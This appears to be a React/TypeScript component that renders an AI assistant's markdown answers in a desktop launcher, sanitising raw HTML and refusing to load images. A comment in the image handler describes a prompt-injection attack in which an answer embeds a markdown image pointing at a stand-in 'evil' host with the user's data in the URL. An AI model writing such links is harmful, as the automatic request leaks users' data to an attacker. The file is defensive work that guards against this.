import { isValidElement, memo, useRef, type MouseEvent, type ReactNode } from "react";
import ReactMarkdown, { type Components, type Options } from "react-markdown";
import remarkGfm from "remark-gfm";
import remarkBreaks from "remark-breaks";
import remarkMath from "remark-math";
import rehypeKatex from "rehype-katex";
import rehypeRaw from "rehype-raw";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import rehypeHighlight from "rehype-highlight";
import "katex/dist/katex.min.css";
import { Check, CornerLeftUp, Image as ImageIcon } from "lucide-react";
import { CopyButton } from "@/ai/copyButton.tsx";
import { MermaidBlock } from "@/ai/mermaidBlock.tsx";
import { splitPoint } from "@/ai/streamSplit.ts";
import { normalizeMath } from "@/ai/mathText.ts";

/**
 * Renders an assistant turn as markdown.
 *
 * Raw HTML is parsed, then sanitised. This is a renderer with a preload bridge
 * attached, so model-authored HTML is an XSS surface, but escaping all of it
 * printed the `<br>` models put in table cells, and `<kbd>`, `<sub>` and
 * `<details>`, as literal tags. rehype-sanitize's default schema is GitHub's:
 * scripts, event handlers, styles and javascript: links are stripped, and
 * what's left still goes through the components below (an <img> stays a
 * placeholder). It runs before KaTeX and the highlighter, whose own markup
 * is trusted.
 *
 * remark-breaks is on because this is a chat, not a document. CommonMark treats
 * a single newline as a soft break and renders it as a space, so an answer like
 * a list of numbers one per line collapsed onto one line. Inside fenced code
 * newlines are literal already, so nothing there changes.
 *
 * Math is typeset with KaTeX. The text goes through normalizeMath first, since
 * models write formulas in several notations and remark-math reads only one.
 *
 * Sized for an 800px launcher window rather than a document: tight leading,
 * small type, and anything that can outgrow the width scrolls in its own box.
 */

const remarkPlugins = [remarkGfm, remarkBreaks, remarkMath];

const sanitizeSchema = {
    ...defaultSchema,
    tagNames: [...(defaultSchema.tagNames ?? []), "mark"],
    attributes: {
        ...defaultSchema.attributes,
        // remark-math's markers, which KaTeX looks for after this runs.
        code: [["className", /^language-./, "math-inline", "math-display"]],
    },
};

const typesetPlugins: NonNullable<Options["rehypePlugins"]> = [
    // A formula KaTeX can't parse shows its source rather than breaking the turn.
    [rehypeKatex, { throwOnError: false, strict: "ignore", errorColor: "var(--color-red-300, #fca5a5)" }],
    // Only blocks that name their language; guessing mislabels as often as not.
    // Mermaid is drawn rather than coloured.
    [rehypeHighlight, { detect: false, plainText: ["mermaid", "math", "text", "txt", "plaintext"] }],
];
const htmlPlugins: Options["rehypePlugins"] = [rehypeRaw, [rehypeSanitize, sanitizeSchema], ...typesetPlugins];

/**
 * rehype-raw re-parses the whole answer through an HTML parser, which nearly
 * doubled the renderer's CPU while an answer streamed, and most answers hold
 * no HTML at all. Text that misses this check keeps any tag escaped, as
 * plain text, so a miss is never unsafe.
 */
const HAS_HTML = /<\/?[a-z][\w-]*[\s/>]|<!--/i;

/**
 * An in-answer link (a footnote and its way back) scrolls within the answer.
 * The sanitiser prefixes every id with "user-content-", so `#fn-1` is found
 * as `user-content-fn-1`. Each answer has its own footnote 1, hence looking
 * only inside this one.
 */
function jumpTo(e: MouseEvent<HTMLElement>, fragment: string) {
    e.preventDefault();
    const root = e.currentTarget.closest("[data-md]");
    const id = decodeURIComponent(fragment);
    const target = root?.querySelector<HTMLElement>(`[id="${CSS.escape(`user-content-${id}`)}"]`)
        ?? root?.querySelector<HTMLElement>(`[id="${CSS.escape(id)}"]`);
    if (!target) return;
    target.scrollIntoView({ block: "center", behavior: "smooth" });
    target.classList.remove("setting-flash");
    void target.offsetWidth; // restarts the animation on a second click
    target.classList.add("setting-flash");
}

const components: Components = {
    p: ({ children }) => <p className="mb-2 last:mb-0 leading-relaxed">{children}</p>,

    h1: ({ children }) => <h1 className="mt-3 first:mt-0 mb-1.5 text-14 font-semibold text-tone-900">{children}</h1>,
    // The footnotes' "Footnotes" label is for screen readers only.
    h2: ({ children, className, id }) => className?.includes("sr-only")
        ? <h2 id={id} className="sr-only">{children}</h2>
        : <h2 className="mt-3 first:mt-0 mb-1.5 text-13.5 font-semibold text-tone-900">{children}</h2>,
    h3: ({ children }) => <h3 className="mt-3 first:mt-0 mb-1 text-13 font-semibold text-tone-850">{children}</h3>,
    h4: ({ children }) => <h4 className="mt-2.5 first:mt-0 mb-1 text-12.5 font-semibold text-tone-800">{children}</h4>,
    h5: ({ children }) => <h5 className="mt-2.5 first:mt-0 mb-1 text-12 font-semibold text-tone-750">{children}</h5>,
    h6: ({ children }) => <h6 className="mt-2.5 first:mt-0 mb-1 text-11 font-semibold uppercase tracking-wide text-tone-500">{children}</h6>,

    // A task list's items carry their own checkbox, so no bullet beside it.
    ul: ({ children, className }) => className?.includes("contains-task-list")
        ? <ul className="mb-2 last:mb-0 pl-0.5 space-y-0.5">{children}</ul>
        : <ul className="mb-2 last:mb-0 pl-4 list-disc marker:text-tone-250 space-y-0.5">{children}</ul>,
    ol: ({ children }) => <ol className="mb-2 last:mb-0 pl-4 list-decimal marker:text-tone-250 space-y-0.5">{children}</ol>,
    li: ({ children, className, id }) => className?.includes("task-list-item")
        ? <li className="flex items-start gap-2 leading-relaxed list-none">{children}</li>
        : <li id={id} className="leading-relaxed pl-0.5 rounded-sm">{children}</li>,
    input: ({ type, checked }) => type === "checkbox" ? (
        <span
            role="checkbox"
            aria-checked={!!checked}
            aria-disabled
            className={`inline-flex shrink-0 items-center justify-center w-3.5 h-3.5 mt-[0.2rem] rounded-[4px] border ${checked ? "bg-emerald-400/20 border-emerald-300/40 text-emerald-200" : "border-line-160 bg-fill-040"}`}
        >
            {checked && <Check size={10} strokeWidth={3} />}
        </span>
    ) : null,

    kbd: ({ children }) => (
        <kbd className="inline-flex items-center px-1.5 py-px rounded border border-line-100 border-b-2 bg-fill-060 font-mono text-10.5 text-tone-800 align-[1px]">{children}</kbd>
    ),
    mark: ({ children }) => <mark className="px-0.5 rounded-sm bg-amber-300/25 text-tone-900">{children}</mark>,
    details: ({ children }) => (
        <details className="group/details my-2 rounded-lg border border-line-080 bg-fill-030 px-3 py-1.5 open:pb-2.5">{children}</details>
    ),
    summary: ({ children }) => (
        <summary className="cursor-pointer select-none py-0.5 text-tone-800 font-medium marker:text-tone-300 group-open/details:mb-1.5">{children}</summary>
    ),

    // GFM footnotes: the definitions under a rule at the end of the answer.
    section: ({ children, className }) => className?.includes("footnotes")
        ? <section className="mt-3 pt-2 border-t border-line-070 text-11 text-tone-500 [&_p]:mb-0">{children}</section>
        : <section>{children}</section>,

    strong: ({ children }) => <strong className="font-semibold text-tone-950">{children}</strong>,
    em: ({ children }) => <em className="italic text-tone-700">{children}</em>,
    del: ({ children }) => <del className="line-through text-tone-400">{children}</del>,

    hr: () => <hr className="my-3 border-line-080" />,

    blockquote: ({ children }) => (
        <blockquote className="my-2 pl-3 border-l-2 border-line-120 text-tone-550">{children}</blockquote>
    ),

    // Links open in the real browser. The main process blocks in-window
    // navigation anyway, so without this a click would simply do nothing.
    a: ({ href, children, node, ...props }) => href?.startsWith("#") ? (
        <a
            href={href}
            id={props.id}
            onClick={(e) => jumpTo(e, href.slice(1))}
            aria-label={props["aria-label"]}
            className={node?.properties.dataFootnoteBackref !== undefined
                ? "ml-1 text-sky-300/70 hover:text-sky-300 no-underline cursor-pointer"
                : "px-px text-sky-300/80 hover:text-sky-300 no-underline cursor-pointer"}
        >
            {node?.properties.dataFootnoteRef !== undefined
                ? <>[{children}]</>
                // GFM's "↩" draws as a blue emoji on Windows.
                : node?.properties.dataFootnoteBackref !== undefined ? <CornerLeftUp size={11} className="inline align-[-1px]" /> : children}
        </a>
    ) : (
        <a
            href={href}
            onClick={(e) => {
                e.preventDefault();
                if (href) window.electron.openExternal(href);
            }}
            className="text-sky-300/75 hover:text-sky-300 underline underline-offset-2 decoration-ink/20 cursor-pointer"
        >
            {children}
        </a>
    ),

    // Never an <img>. Rendering one fetches its URL with no click, and a
    // prompt-injected answer can write `![](https://evil/?d=<your data>)`,
    // the request itself is the leak. A labelled placeholder instead, opened
    // in the browser only if you choose to. A span rather than a link, since
    // an image can sit inside a link and links can't nest.
    img: ({ src, alt }) => {
        const url = typeof src === "string" ? src : "";
        return (
            <span
                role="link"
                tabIndex={0}
                title={url ? `Image not loaded. Open ${url}` : "Image not loaded"}
                onClick={(e) => {
                    e.preventDefault();
                    e.stopPropagation();
                    if (url) window.electron.openExternal(url);
                }}
                onKeyDown={(e) => {
                    if (e.key !== "Enter" || !url) return;
                    e.preventDefault();
                    window.electron.openExternal(url);
                }}
                className="inline-flex items-center gap-1 max-w-full px-1.5 py-0.5 rounded border border-line-080 bg-fill-050 text-11 text-sky-300/75 hover:text-sky-300 align-middle cursor-pointer"
            >
                <ImageIcon size={11} className="shrink-0" />
                <span className="truncate">{alt || "Image"}</span>
            </span>
        );
    },

    code: ({ className, children, ...props }) => {
        // react-markdown marks fenced blocks with a language- class. A fence
        // that names none has no class, but its text always ends in a newline,
        // which an inline span never holds; without that check a plain fenced
        // block was styled as inline code.
        const isBlock = /language-|hljs/.test(className ?? "") || (typeof children === "string" && children.includes("\n"));
        if (!isBlock) {
            return (
                <code className="px-1 py-0.5 rounded bg-fill-070 border border-line-060 font-mono text-11 text-amber-100/75 break-words">
                    {children}
                </code>
            );
        }
        return (
            <code className={`${className ?? ""} font-mono text-11 leading-relaxed text-tone-800`} {...props}>
                {children}
            </code>
        );
    },

    pre: ({ children }) => {
        const code = isValidElement<{ className?: string; children?: ReactNode }>(children) ? children.props : null;
        if (code?.className?.includes("language-mermaid") && typeof code.children === "string") {
            return <MermaidBlock source={code.children} renderCode={actions => <CodeBlock actions={actions}>{children}</CodeBlock>} />;
        }
        return <CodeBlock>{children}</CodeBlock>;
    },

    // Tables are the most likely thing to exceed 800px, so the wrapper, not
    // the page, takes the horizontal scroll.
    table: ({ children }) => (
        <div className="my-2 overflow-x-auto scrollbar-thin-shadcn rounded-lg border border-line-080">
            {/* min-w-full, not w-full: w-full pinned the table to the wrapper so
                it could never overflow, which made the scroll container
                decorative and crushed wide tables into the available space. */}
            <table className="min-w-full border-collapse text-11.5">{children}</table>
        </div>
    ),
    thead: ({ children }) => <thead className="bg-fill-050">{children}</thead>,
    tr: ({ children }) => <tr className="border-b border-line-050 last:border-0">{children}</tr>,

    // `style` carries the column alignment GFM declares in its delimiter row
    // (`|---:|`). Dropping it, as these did, silently ignored every alignment
    // an answer asked for. The inline value also beats the default class below.
    th: ({ children, style }) => (
        <th
            style={style}
            className="px-3 py-2 text-left font-medium text-tone-750 whitespace-nowrap border-b border-line-100 border-r border-line-050 last:border-r-0"
        >
            {children}
        </th>
    ),
    td: ({ children, style }) => (
        <td
            style={style}
            className="px-3 py-1.5 align-top text-tone-650 border-r border-line-040 last:border-r-0"
        >
            {children}
        </td>
    ),
};

/**
 * A fenced block with its own copy button.
 *
 * The text is read off the rendered DOM rather than reassembled from React
 * children, children are a nested tree of elements, and flattening them back
 * to source drops newlines. The DOM already holds exactly what's on screen.
 */
function CodeBlock({ children, actions }: { children: ReactNode; actions?: ReactNode }) {
    const ref = useRef<HTMLPreElement>(null);

    return (
        <div className="group/code relative my-2">
            <pre
                ref={ref}
                className="p-2.5 pr-9 rounded-lg bg-[var(--code-bg)] border border-line-070 overflow-x-auto scrollbar-thin-shadcn"
            >
                {children}
            </pre>
            <div className="absolute top-1.5 right-1.5 flex gap-1 opacity-0 group-hover/code:opacity-100 focus-within:opacity-100 transition-opacity">
                {actions}
                <CopyButton
                    label="Copy code"
                    getText={() => ref.current?.innerText ?? ""}
                    className="bg-fill-060 hover:bg-fill-120 border border-line-070"
                />
            </div>
        </div>
    );
}

/**
 * A streaming answer, split so the finished blocks are parsed once and only the
 * block currently being written is re-parsed per frame.
 *
 * Without this, every frame re-parsed the entire answer: measured at ~30ms for
 * a long reply, against a 16ms frame budget, which is what made streaming feel
 * like it was dragging.
 */
export const StreamingMarkdown = memo(function StreamingMarkdown({ children }: { children: string }) {
    const at = splitPoint(children);
    if (at === -1) return <Markdown>{children}</Markdown>;
    return (
        <>
            {/* Memoised on its own text, so it re-parses only when a block completes. */}
            <Markdown>{children.slice(0, at)}</Markdown>
            <Markdown>{children.slice(at)}</Markdown>
        </>
    );
});

/**
 * Memoised on the text: during a stream every token re-renders the transcript,
 * and re-parsing every completed message each time is wasted work.
 */
export const Markdown = memo(function Markdown({ children }: { children: string }) {
    return (
        <div data-md className="text-12.5 leading-relaxed text-tone-750 break-words">
            <ReactMarkdown
                remarkPlugins={remarkPlugins}
                rehypePlugins={HAS_HTML.test(children) ? htmlPlugins : typesetPlugins}
                components={components}
            >
                {normalizeMath(children)}
            </ReactMarkdown>
        </div>
    );
});
